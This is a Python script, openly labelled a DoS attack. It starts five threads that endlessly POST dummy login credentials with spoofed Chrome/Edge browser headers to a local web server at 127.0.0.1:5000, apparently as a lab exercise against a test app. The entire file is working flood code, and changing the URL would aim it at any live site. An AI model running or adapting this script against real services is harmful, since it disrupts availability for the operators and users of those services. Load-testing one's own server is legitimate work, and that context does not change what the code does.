import threading

import requests


def dos_request(url, payload, headers):

    while True:
        try:
            response = requests.request("POST", url, headers=headers, data=payload)
            print(f"Sending DoS request, Status Code: {response.status_code}")
        except Exception as e:
            print(f"An Error Occurred: {e}")
            break


def Dos_attack():

    # target url (local host) for DoS attack
    url = "http://127.0.0.1:5000/"

    # email and password payload
    payload = "email=dos_attack&password=dos_attack"

    # headers for the request
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "http://127.0.0.1:5000",
        "Referer": "http://127.0.0.1:5000/",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",
        "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Microsoft Edge";v="134"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }

    # number of threads for the attack
    multi_thread = 5
    thread_list = []

    # begin the DoS attack
    print("Starting DoS attack...")

    for i in range(multi_thread):
        thread = threading.Thread(target=dos_request, args=(url, payload, headers))
        thread.start()
        thread_list.append(thread)

    for thread in thread_list:
        thread.join()


if __name__ == "__main__":
    # start the DoS attack
    Dos_attack()
    print("DoS attack finished.")
